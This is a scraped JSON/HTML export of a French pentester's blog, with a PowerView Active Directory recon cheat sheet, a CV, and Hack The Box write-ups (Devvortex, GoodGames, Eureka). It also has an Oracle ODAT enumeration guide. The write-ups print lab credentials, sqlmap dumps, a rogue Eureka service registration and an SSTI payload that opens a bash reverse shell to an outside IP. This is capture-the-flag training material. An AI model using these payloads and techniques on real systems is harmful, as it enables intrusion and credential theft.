tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-DomainUserLocation\u003c/span\u003e \u003cspan class=\"n\"\u003e-UserGroupIdentity\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;RDPUsers\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-5-acl-et-permissions\"\u003e🔐 5. ACL et Permissions\u003c/h2\u003e\n\u003ch3 id=\"-obtenir-les-acl-dun-objet\"\u003e🔍 Obtenir les ACL d’un objet\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-DomainObjectAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-SamAccountName\u003c/span\u003e \u003cspan class=\"n\"\u003euser1\u003c/span\u003e \u003cspan class=\"n\"\u003e-ResolveGUIDs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-rechercher-des-ace-intéressants\"\u003e🧠 Rechercher des ACE intéressants\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eFind-InterestingDomainAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-ResolveGUIDs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"-acl-sur-un-chemin-spécifique\"\u003e📂 ACL sur un chemin spécifique\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-PathAcl\u003c/span\u003e \u003cspan class=\"n\"\u003e-Path\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\\\\dcorp-dc.dollarcorp.moneycorp.local\\sysvol\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-6-autres-techniques\"\u003e📂 6. Autres Techniques\u003c/h2\u003e\n\u003ch3 id=\"-découverte-de-serveurs-de-fichiers\"\u003e📂 Découverte de serveurs de fichiers\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eGet-NetFileServer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"-ressources-utiles\"\u003e📚 Ressources utiles\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://powersploit.readthedocs.io/en/latest/Recon/\"\u003ePowerView Documentation (PowerSploit)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://learn.microsoft.com/en-us/powershell/module/activedirectory/\"\u003eCmdlets Active Directory Microsoft\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"Reconnaissance Active Directory avec PowerView"},{"content":" Michel NYOBE | Pentester \u0026amp; Cloud Security Enthusiast\n📍 Paris, France | 📧 michelnyobe87@gmail.com | 🔐\nProfil Passionné par la cybersécurité offensive, le je me spécialise dans les attaques Active Directory, le pentesting d’environnements cloud (Azure \u0026amp; AWS), et la sécurité des identités. En formation continue et à la recherche d’un poste/apprentissage en Red Team ou pentest.\nLabs et Environnements Active Directory Lab (6 VM) automatisé sur Azure Plateformes : TryHackMe\nHackTheBox\nRoot-Me\nDéfis réguliers : Pro Labs Dante HTB Zephyr HTB https://www.root-me.org/vladimirlarass\n--- ## Formations \u0026 Certifications CRTP (A jour) — Certified Red Team Professional CRTE (A jour) — Certified Red Team Expert CARTP (En cours) — Certified Azure Red Team Professional CPTS - HTB (en cours) — Certified Penetration Testing Specialist ** OSCP ( En cours) AZ-900 (A jour) — Azure Fundamentals AZ-500 (A jour) — Azure Security Engineer SC-900 (A jour) — Security, Compliance, and Identity Fundamentals CNSP ( A jour ) — Certified Network Security Practitioner Security+ (CompTIA) : Concepts fondamentaux de la sécurité SI, gestion des incidents, sécurité réseau et organisationnelle HTB ProLabs : DANTE, Zephyr Expériences 🛡️ Développeur Logiciels de Sécurité – ENIX (07/2023 – 01/2024) Développement de scripts (Next.js, GraphQL) Administration d’Active Directory, Wazuh, PowerShell 🔐 DevSecOps – TDR Consulting (05/2022 – 07/2023) Sécurisation des chaînes CI/CD : Docker, Kubernetes, Jenkins Projets : Uptiimum.tech, IFPCE Africa 🧠 Ingénieur Sécurité (Stage) – Backbone Corp (08/2021 – 10/2021) Configuration de serveurs, sauvegarde (Zabbix, Bacula) Python, documentation technique 💻 Technicien Support Informatique (Stage) – ENEO (07/2019 – 10/2019) Administration réseau (Cisco), Active Directory Virtualisation : VMware, Proxmox 🛡️ Compétences Techniques en Cybersécurité 🔍 Tests d’Intrusion Active Directory Les tests d’intrusion AD simulent des attaques ciblant des environnements Windows d’entreprise.\n🏁 Reconnaissance Active Directory Enumération Active Directory Enumération LDAP : ldapsearch, ADFind, SharpHound Cartographie des relations d’accès avec BloodHound (Neo4j) Enumération DNS interne : nslookup, dig, dnscmd Enumération des partages et services : smbclient, smbmap, rpcclient, CrackMapExec 🔐 Techniques d’authentification AS-REP Roasting : utilisateurs avec DONT_REQ_PREAUTH Kerberoasting : extraction de tickets TGS Pass-the-Hash : utilisation de hash NTLM pour l’authentification Pass-the-Ticket : réutilisation de tickets Kerberos Overpass-the-Hash / Pass-the-Key : création de TGT NTLM Relay : ntlmrelayx, mitm6 🧬 Exploitation des délégations Délégation non contrainte : extraction TGT depuis les services Délégation contrainte (S4U2Self / S4U2Proxy) : abus via Rubeus RBCD (Resource-Based Constrained Delegation) : Powermad, Rubeus 🛠️ Vulnérabilités spécifiques Zerologon (CVE-2020-1472) : élévation via Netlogon PetitPotam : coercion NTLM via MS-EFSRPC PrintNightmare (CVE-2021-34527) : RCE via spouleur Shadow Credentials : ajout de clé dans AD LAPS et GPP Passwords : extraction dans SYSVOL 🧑‍💻 Mouvement latéral \u0026amp; persistance DCSync, DCShadow Golden Ticket, Silver Ticket Skeleton Key, SIDHistory abuse , - SID : Identificateurs de sécurité Credential Dumping : Mimikatz, LaZagne, Rubeus, SharpDPAPI 💥 Exploitation de Vulnérabilités 🔎 Scanning \u0026amp; Enumeration Nmap, Nessus, OpenVAS, Nikto, LinPEAS, WinPEAS Recherche de failles : searchsploit, exploit-db, CVE.sh, VulnHub ⚙️ Techniques Buffer Overflow, SEH, DEP/ASLR bypass Injections : SQLi, Commande, XXE, XSS, LFI/RFI Escalade locale : kernel exploits, SUID abuse, ACL Reverse Engineering : Ghidra, strings, radare2 📡 Outils Metasploit, Impacket, Responder, CrackMapExec, Evil-WinRM Post-exploitation : Chisel, Ligolo, Pupy, PowerView, Empire 🌐 Attaques Web 🔍 Reconnaissance Fuzzing \u0026amp; découverte : FFUF, Gobuster, Dirsearch Interception \u0026amp; Analyse : Burp Suite, ZAP, Postman Analyse JS, robots.txt, cookies, headers HTTP 💉 Vulnérabilités Web SQLi, XSS (Reflected, Stored, DOM) Command Injection, SSRF, XXE File Inclusion (LFI/RFI) File Upload bypass (extension, MIME) CSRF, Broken Access Control (IDOR, path traversal) Auth bypass, Brute force, JWT cracking 🧪 Post-exploitation Reverse shells en PHP, Python, Bash Webshells : C99, WSO, China Chopper SSRF vers metadata AWS, Pivoting via intranet 🔧 Outils Web Burp Suite, SQLmap, WFuzz, XSStrike, Commix, JWT Tool 🔐 Cloud Security ☁️ Microsoft Azure \u0026amp; Azure AD IAM \u0026amp; Sécurité : RBAC, PIM, Conditional Access, Identity Protection Microsoft Defender (Cloud, Endpoint) : Posture de sécurité, alertes, intégration Sentinel Microsoft Sentinel (SIEM) : KQL, alertes, playbooks, détection MITRE Outils : Az, AzureHound, Stormspotter, ROADtools, AADInternals ☁️ AWS Security IAM (Roles, Policies, MFA, SCP) Logging \u0026amp; audit : CloudTrail, Config, CloudWatch Détection \u0026amp; alertes : GuardDuty, Security Hub, Macie Outils Red Team : Pacu, enumerate-iam, cloudsplaining, ScoutSuite 📊 SIEM Splunk : SPL, détection de comportements, dashboards QRadar : corrélation, offenses, log sources Wazuh : HIDS, ELK, intégration Sysmon 📌 Cas pratiques Détection brute force, exfiltration DNS Analyse de logs AD, GPO, accès privilégiés Threat Hunting MITRE ATT\u0026amp;CK ⚙️ SOAR Cortex XSOAR : Playbooks automatisés : enrichissement IOC, blocage IP Intégration avec EDR, SIEM, antivirus, email Cas d’usage : phishing, quarantaine automatique, sandbox analyse 🧪 Analyse de Logs \u0026amp; Réponse à Incident Journaux : Syslog, Event Viewer, Apache/Nginx, Firewall, AV/EDR Techniques de Threat Hunting (MITRE, hypothesis-based) Outils : YARA, Sigma, Sysmon, KAPE, Velociraptor 📈 Vulnerability Management Outils : Nessus, OpenVAS, CVE.sh Processus : Scans récurrents, CVSS scoring Patch management, hardening, benchmark CIS/STIG Reporting : priorisation, KPI, plans de remédiation 🧰 Outils Techniques Offensive Burp Suite, Nmap, Metasploit, Wireshark Impacket, CrackMapExec, BloodHound Responder, Rubeus, PowerView, Mimikatz Tools Web : SQLmap, FFUF, Dirsearch, ZAP Reverse \u0026amp; Post-exploitation Ghidra, strings, radare2, Powershell Empire, Covenant 🤖 Automatisation \u0026amp; Scripting Bash : durcissement Linux, audits, automatisation PowerShell : scripts d’audit AD, post-exploitation Windows Python : scrapers, outils offensifs, parsing, APIs Frameworks : Requests, Paramiko, Nmap, Shodan, Flask, PyInstaller 🚀 CI/CD \u0026amp; DevSecOps GitHub Actions, Azure DevOps : CI/CD, linters, scan SAST Docker : images sécurisées, vulnérabilité scan (Trivy, Snyk) Kubernetes (base) : RBAC, secrets, pods, monitoring Intégration des outils de sécurité dans les pipelines (DevSecOps) 💻 Langages de Programmation Python : outils de pentest, détection de vulnérabilités PHP : développement Web (Laravel), injections C / C++ : exploitation mémoire, reverse engineering JavaScript : développement web ","permalink":"https://nyobemichel.me/about/","summary":"\u003cdiv style=\"font-size: 13px;\"\u003e\n\u003cp\u003e\u003cstrong\u003eMichel NYOBE\u003c/strong\u003e | Pentester \u0026amp; Cloud Security Enthusiast\u003cbr\u003e\n📍 Paris, France | 📧 \u003ca href=\"mailto:michelnyobe87@gmail.com\"\u003emichelnyobe87@gmail.com\u003c/a\u003e | 🔐\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"profil\"\u003eProfil\u003c/h2\u003e\n\u003cp\u003ePassionné par la \u003cstrong\u003ecybersécurité offensive\u003c/strong\u003e, le je me spécialise dans les attaques \u003cstrong\u003eActive Directory\u003c/strong\u003e, le pentesting d’environnements cloud (Azure \u0026amp; AWS), et la sécurité des identités. En formation continue et à la recherche d’un poste/apprentissage en Red Team ou pentest.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"labs-et-environnements\"\u003eLabs et Environnements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eActive Directory Lab (6 VM) automatisé sur Azure\u003c/li\u003e\n\u003cli\u003ePlateformes :\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eTryHackMe\u003c/p\u003e","title":"Whoami /All"},{"content":"Enumeration Nmap Nous avons débuté l\u0026rsquo;engagement par une analyse de port à l\u0026rsquo;aide de l\u0026rsquo;outil Nmap afin d\u0026rsquo;identifier les services exposés sur la cible.\nnmap -sV -sC 10.10.11.242 -v --min-rate 1000 -Pn -T4 -p- Les résultats du scan Nmap indiquent que seuls les ports 22 (SSH) et 80 (HTTP) sont ouverts sur la cible.\nLors de l\u0026rsquo;analyse, nous avons identifié le domaine devvortex.htb, qu’il a été nécessaire d’ajouter manuellement au fichier hosts local afin d’en permettre la résolution DNS.\nSuite à l’énumération des sous-domaines et des répertoires à l’aide de l’outil ffuf , nous avons découvert un sous-domaine supplémentaire : dev.devvortex.htb.\nL’énumération des domaines associés à dev.devvortex.htb nous a permis d’identifier une interface d’administration accessible via dev.devvortex.htb/administrator, sur laquelle nous avons constaté la présence d’un template Joomla.\nAprès avoir identifié l’utilisation du CMS Joomla, nous avons analysé les fichiers accessibles publiquement et inspecté le code source de la page d’administration. Cette investigation nous a permis de retrouver un fichier joomla.xml, situé dans /administrator/manifests/files/, contenant les métadonnées du CMS, notamment sa version exacte. Une vérification croisée via des recherches en ligne a confirmé la version identifiée.\nNous avons ensuite effectué des recherches en ligne concernant la version identifiée de Joomla et avons découvert qu’elle est affectée par une vulnérabilité connue et nous l\u0026rsquo;avions exploite\nruby exploit.rb http://dev.devvortex.htb user : lewis password: P4ntherg0t1n5r3c0n##\nServer-Side Template injection Après avoir accédé à l’interface d’administration Joomla, nous avons exploité une vulnérabilité de type Server-Side Template Injection (SSTI) présente dans le gestionnaire de templates. Cette faille nous a permis d’injecter du code côté serveur et d’obtenir une exécution de commandes arbitraires sur la machine cible.\nAprès l’exploitation initiale, nous avons poursuivi avec une phase d’énumération des services internes disponibles sur le réseau. Cette analyse nous a permis d’identifier un service MySQL en cours d’exécution. En nous connectant à ce service, nous avons pu énumérer les bases de données ainsi que leurs tables. Cette exploration nous a permis de récupérer des informations sensibles, notamment les identifiants associés à l’utilisateur \u0026rsquo;logan'.\nnc -lvnp 443 $ ss -tlpn $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u\nlogan tequieromucho\nGrâce à l\u0026rsquo;identification du hash bcrypt associé à l\u0026rsquo;utilisateur \u0026rsquo;logan\u0026rsquo;, nous avons réussi à retrouver le mot de passe en clair par attaque par dictionnaire. Cela nous a permis de nous connecter avec succès en ssh .\nhashcat -m 3200 lol.txt /home/kali/Documents/TryHackme/Wordlist/rockyou.txt Elevation de privilege Dans le cadre de l’élévation de privilèges, nous avons analysé l’environnement du système compromis à la recherche de vulnérabilités locales. Cette analyse nous a permis d’identifier une faille de sécurité connue, référencée sous un identifiant CVE-2023-1326, exploitable sur le système. En tirant parti de cette vulnérabilité, nous avons obtenu un accès privilégié (root) à la machine\nReferences https://github.com/Acceis/exploit-CVE-2023-23752 https://github.com/diego-tella/CVE-2023-1326-PoC https://x.com/7h3h4ckv157/status/1728753489839628604 https://www.revshells.com/ https://academy.hackthebox.com/module/details/145\n","permalink":"https://nyobemichel.me/posts/devvortex/","summary":"Difficulte : esay","title":"Devvortex -HTB"},{"content":"Enumeration Nmap Nous débutons notre phase de reconnaissance par un scan Nmap de la cible.\n80/tcp open http Werkzeug httpd 2.0.2 (Python 3.9.2) |_http-title: GoodGames | Community and Store | http-methods: |_ Supported Methods: GET HEAD OPTIONS POST |_http-server-header: Werkzeug/2.0.2 Python/3.9.2 |_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB L’analyse révèle que seul le port 80 est ouvert et qu’il héberge un serveur HTTP Python via Werkzeug 2.0.2.\nServeur Web Python En accédant au site via le port 80, nous tombons sur une interface web : http://goodgames.htb/\nAjout de l’entrée DNS au fichier hosts :\nsudo echo \u0026#34;10.10.11.130 goodgames.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts En inspectant la fonctionnalité de connexion, une tentative d\u0026rsquo;injection SQL est envisagée. Toutefois, l\u0026rsquo;application impose la saisie d’une adresse e-mail valide.\nNous utilisons alors une adresse valide, puis interceptons la requête dans Burp Suite pour modifier l’e-mail en admin@goodgames.htb. Une fois soumise, un message de bienvenue s’affiche, indiquant une possible compromission du compte administrateur.\nInjection SQL Après confirmation d\u0026rsquo;une vulnérabilité SQLi, nous enregistrons la requête HTTP dans un fichier nommé goodgames.req afin de l\u0026rsquo;exploiter avec sqlmap.\nsqlmap -r goodgames.req --dbs Sqlmap révèle deux bases de données :\ninformation_schema\nmain\nNous listons ensuite les tables de la base main :\nsqlmap -r goodgames.req -D main --tables Et enfin, nous extrayons les données de la table user :\nsqlmap -r goodgames.req -D main -T user --dump Résultat :\nadmin@goodgames.htb : superadministrator Portail Interne d\u0026rsquo;Administration En haut à droite du tableau de bord, une icône d’engrenage mène à une URL interne :\nhttp://internal-administration.goodgames.htb/login\nAjout de l’entrée dans le fichier hosts :\nsudo echo \u0026#34;10.10.11.130 internal-administration.goodgames.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Nous utilisons les identifiants extraits (admin / superadministrator) pour accéder à l’interface d\u0026rsquo;administration. Cela nous donne accès au dashboard.\nSSTI (Server-Side Template Injection) Nous suspectons une vulnérabilité SSTI. Une charge utile de test est injectée :\n{{ namespace.__init__.__globals__.os.popen(\u0026#39;id\u0026#39;).read() }} La commande est exécutée, confirmant la vulnérabilité. Nous exploitons cela pour obtenir un reverse shell :\n{{ namespace.__init__.__globals__.os.popen(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.6/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;).read() }} Escalade de Privilèges Énumération L’environnement montre plusieurs signes d’une exécution dans un conteneur Docker. On y observe également des fichiers liés à un utilisateur inconnu (UID 1000) inexistant dans /etc/passwd.\nUne adresse IP privée suggère une architecture en réseau Docker. Nous réalisons un scan ping :\nfor i in {1..254}; do (ping -c 1 172.19.0.${i} | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done Et un scan des ports :\nfor port in {1..65535}; do echo \u0026gt; /dev/tcp/172.19.0.1/$port \u0026amp;\u0026amp; echo \u0026#34;$port open\u0026#34;; done 2\u0026gt;/dev/null Le processus docker est actif sur le système.\nL\u0026rsquo;utilisateur augustus, présent sur le système, dispose d’un répertoire utilisateur contenant des fichiers identiques à ceux du conteneur.\nÉvasion de Conteneur \u0026amp; Accès Root Nous copions /bin/bash dans le répertoire d’augustus :\nPuis exécutons le binaire avec l’option -p pour préserver les privilèges root :\n./bash -p Cela nous accorde un shell avec les droits root hors du conteneur.\n","permalink":"https://nyobemichel.me/posts/goodgame/","summary":"Difficulte : esay","title":"GoodGame-HTB"},{"content":"Enumeration Nmap Enumeration Nmap Nous commençons par exécuter une analyse nmap sur la cible :\nLe scan révèle que les ports 22, 80 et 8761 sont ouverts sur la cible.\nEn explorant le port 80, nous avons découvert un site web accessible à l\u0026rsquo;adresse furni.htb.\nAfin d’identifier d’éventuelles ressources non listées accessibles sur le serveur web de la cible http://furni.htb, un fuzzing de répertoires a été réalisé à l’aide de l’outil ffuf.\nffuf -u http://furni.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt Cela m\u0026rsquo;a permis d’identifier plusieurs sous-domaines associés à la cible. Ces sous-domaines peuvent héberger des fichiers, dossiers ou applications supplémentaires potentiellement intéressants à la suite de l’analyse.\nAprès avoir téléchargé l\u0026rsquo;ensemble des fichiers disponibles et entamé leur analyse un par un, j\u0026rsquo;ai identifié un fichier nommé headpdump. En examinant son contenu, j\u0026rsquo;ai recherché la présence éventuelle d\u0026rsquo;informations sensibles telles que des identifiants ou des mots de passe. Cette inspection m’a permis de mettre en évidence des données potentiellement intéressantes.\npassword=0sc@r190_S0l!dP@sswd, user=oscar190\nhttp://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!\nOscar parvient à se connecter via SSH, mais j\u0026rsquo;ai également repéré le service Eureka. Afin d\u0026rsquo;y accéder, je vais configurer une redirection de port pour pouvoir me connecter au port 8761.\nssh -L 8761:localhost:8761 oscar190@10.10.11.66 Les identifiants récupérés seront testés sur l’ensemble des interfaces de connexion identifiées précédemment. login: EurekaSrvr password: 0scarPWDisTheB3st\nNous allons déployer un service factice basé sur l’exemple \u0026ldquo;Hacking Netflix Eureka\u0026rdquo;, dans le but de simuler une présence légitime au sein de l’environnement et d’exploiter la confiance accordée aux services enregistrés.\ncurl -X POST http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{ \u0026#34;instance\u0026#34;: { \u0026#34;instanceId\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;hostName\u0026#34;: \u0026#34;YOURIP\u0026#34;, \u0026#34;app\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;ipAddr\u0026#34;: \u0026#34;YOURIP\u0026#34;, \u0026#34;vipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;secureVipAddress\u0026#34;: \u0026#34;USER-MANAGEMENT-SERVICE\u0026#34;, \u0026#34;status\u0026#34;: \u0026#34;UP\u0026#34;, \u0026#34;port\u0026#34;: { \u0026#34;$\u0026#34;: 8081, \u0026#34;@enabled\u0026#34;: \u0026#34;true\u0026#34; }, \u0026#34;dataCenterInfo\u0026#34;: { \u0026#34;@class\u0026#34;: \u0026#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MyOwn\u0026#34; } } }\u0026#39; Nous avons réussi à extraire le nom d\u0026rsquo;utilisateur et le mot de passe associés au service ciblé, ce qui permet une élévation des privilèges ou un accès non autorisé aux ressources internes.\nusername=miranda.wise%40furni.htb\u0026amp;password=IL%21veT0Be%26BeT0L0ve\u0026amp;_csrf=JIVbCzoWJkTBdEsVTbZrxfWiTajQj9Lg9FvXWFIcckIGJ5AuQOM_aFknH3DsRigsLJtf88DBYMm1vefNwG7vYGd-SyA1QqhP ! password : IL!veT0Be\u0026amp;BeT0L0ve\nCyberChef - GCHQ\nHacking Netflix Eureka - Backbase\n","permalink":"https://nyobemichel.me/posts/eureka/","summary":"Difficulte : esay","title":"Eureka-HTB"},{"content":"Bienvenue dans mon premier article Hugo ! 🎉\nPourquoi utiliser Hugo ? 💨 Rapide 📄 Basé sur Markdown 🎨 Personnalisable avec des thèmes comme PaperMod Ce que tu peux faire Ajouter des images Créer des liens internes Générer un site statique complet Exemple de code hugo new posts/mon-article.md ","permalink":"https://nyobemichel.me/posts/example/","summary":"Ceci est un exemple de post pour tester Hugo avec le thème PaperMod.","title":"Bienvenue sur mon premier article"},{"content":"","permalink":"https://nyobemichel.me/posts/azure/enumeration---azure/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/azure/identit%C3%A9-et-acc%C3%A8s-s%C3%A9curis%C3%A9s/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/azure/zero-trust/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---azure/","summary":"","title":""},{"content":"Le serveur Oracle Transparent Network Substrate( TNS) est un protocole de communication qui facilite la communication entre les bases de données et les applications Oracle sur les réseaux.\nAvant de pouvoir énumérer l\u0026rsquo;écouteur TNS et interagir avec lui, nous devons télécharger quelques paquets et outils\nwget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip sudo mkdir -p /opt/oracle sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH export PATH=$LD_LIBRARY_PATH:$PATH source ~/.bashrc git clone https://github.com/quentinhardy/odat.git cd odat/ pip install python-libnmap git submodule init git submodule update pip3 install cx_Oracle sudo apt-get install python3-scapy -y sudo pip3 install colorlog termcolor passlib python-libnmap sudo apt-get install build-essential libgmp-dev -y pip3 install pycryptodome ./odat.py -h # si l\u0026#39;instalation a reuissi Oracle Database Attacking Tool ( ODAT) est un outil de test d\u0026rsquo;intrusion open source écrit en Python et conçu pour recenser et exploiter les vulnérabilités des bases de données Oracle. Il permet d\u0026rsquo;identifier et d\u0026rsquo;exploiter diverses failles de sécurité dans les bases de données Oracle, notamment l\u0026rsquo;injection SQL, l\u0026rsquo;exécution de code à distance et l\u0026rsquo;élévation de privilèges.\nBrute force SID sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute ./odat.py all -s 10.129.204.235 SQLplus pour se connecter a la bd\nsqlplus username/password@10.129.204.235/XE Si vous rencontrez l\u0026rsquo;erreur suivante sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, veuillez exécuter ce qui suit, extrait d\u0026rsquo; ici .\nsudo sh -c \u0026#34;echo /usr/lib/oracle/12.2/client64/lib \u0026gt; /etc/ld.so.conf.d/oracle-instantclient.conf\u0026#34;;sudo ldconfig sqlplus username/password@10.129.204.235/XE as sysdba SQL\u0026gt; select * from user_role_privs; SQL\u0026gt; select name, password from sys.user Telechargement de fichier\n./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---oracle-tns/","summary":"\u003cp\u003eLe serveur \u003ccode\u003eOracle Transparent Network Substrate\u003c/code\u003e( \u003ccode\u003eTNS\u003c/code\u003e) est un protocole de communication qui facilite la communication entre les bases de données et les applications Oracle sur les réseaux.\u003c/p\u003e\n\u003cp\u003eAvant de pouvoir énumérer l\u0026rsquo;écouteur TNS et interagir avec lui, nous devons télécharger quelques paquets et outils\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo mkdir -p /opt/oracle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eLD_LIBRARY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/opt/oracle/instantclient_21_4:\u003cspan class=\"nv\"\u003e$LD_LIBRARY_PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$LD_LIBRARY_PATH\u003c/span\u003e:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e ~/.bashrc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/quentinhardy/odat.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e odat/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip install python-libnmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit submodule init\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit submodule update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip3 install cx_Oracle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo 